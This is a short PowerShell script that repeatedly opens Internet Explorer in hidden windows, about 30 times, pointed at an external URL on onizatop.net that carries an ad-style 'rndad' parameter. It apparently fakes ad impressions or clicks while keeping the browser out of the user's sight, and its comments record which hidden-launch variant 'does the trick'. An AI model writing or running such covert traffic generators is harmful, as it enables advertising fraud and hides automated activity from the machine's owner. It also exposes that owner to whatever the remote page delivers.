REM this is made by RD
$t = 0;
while ($t -le 2)
{
      
      For($i=1;$i -le 10 ;$i++)
      {    
		#Start-Process -WindowStyle Hidden "http://onizatop.net/-36697FQJD/9WbH?rndad=2889525291-1621178790"
            #this one does the trick
            Start-Process -WindowStyle Hidden "C:\Program Files\Internet Explorer\iexplore.exe" "http://onizatop.net/-36697FQJD/9WbH?rndad=2889525291-1621178790"
            #Start-Process -FilePath "C:\Program Files\Internet Explorer\iexplore.exe" -WindowStyle Normal  "http://onizatop.net/-36697FQJD/9WbH?rndad=2889525291-1621178790"
      }
      $t++
}
